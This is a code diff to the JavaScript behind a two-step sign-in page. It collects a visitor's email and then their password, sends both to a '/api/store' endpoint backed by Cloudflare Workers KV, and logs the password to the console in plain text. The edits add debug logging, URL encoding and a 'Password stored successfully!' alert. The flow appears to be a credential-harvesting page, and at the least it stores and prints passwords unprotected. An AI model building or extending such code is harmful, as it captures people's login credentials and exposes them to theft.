@@ -7,7 +7,7 @@ async function storeCredential(key, value) {
     console.log('storeCredential function called');
     try {
         console.log(`Sending request to store: key=${key}, value=${value}`);
-        const response = await fetch(`${PAGES_URL}/api/store`, {
+        const response = await fetch('/api/store', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
@@ -35,7 +35,9 @@ async function storeCredential(key, value) {
 // Code for index.html (Handles form submission)
 const form = document.getElementById('signin-form');
 if (form) {
+    console.log('Sign-in form found');
     form.addEventListener('submit', async function (event) {
+        console.log('Sign-in form submitted');
         event.preventDefault();
         const emailInput = document.getElementById('email');
         const email = emailInput.value;
@@ -43,8 +45,7 @@ if (form) {
         // Store email in Cloudflare Workers KV (key only)
         await storeCredential(email, "");
 
-        window.location.href = `welcome.html?email=${email}`;
-
+        window.location.href = `welcome.html?email=${encodeURIComponent(email)}`;
     });
 }
 
@@ -53,12 +54,15 @@ const urlParams = new URLSearchParams(window.location.search);
 const userEmail = urlParams.get('email');
 const userEmailElement = document.getElementById('user-email');
 if (userEmailElement) {
+    console.log('User email element found');
     userEmailElement.textContent = userEmail;
 }
 
 const passwordForm = document.getElementById('password-form');
 if (passwordForm) {
+    console.log('Password form found');
     passwordForm.addEventListener('submit', async function (event) {
+        console.log('Password form submitted');
         event.preventDefault();
         const passwordInput = document.getElementById('password');
         const password = passwordInput.value;
@@ -68,6 +72,7 @@ if (passwordForm) {
 
         // Redirect or display a success message
         console.log('Password stored in KV:', password);
+        alert('Password stored successfully!');
     });
 }
 
@@ -75,6 +80,7 @@ if (passwordForm) {
 const passwordInput = document.getElementById('password');
 const showPasswordCheckbox = document.getElementById('show-password');
 if (passwordInput && showPasswordCheckbox) {
+    console.log('Password input and checkbox found');
     showPasswordCheckbox.addEventListener('change', function () {
         passwordInput.type = this.checked ? 'text' : 'password';
     });
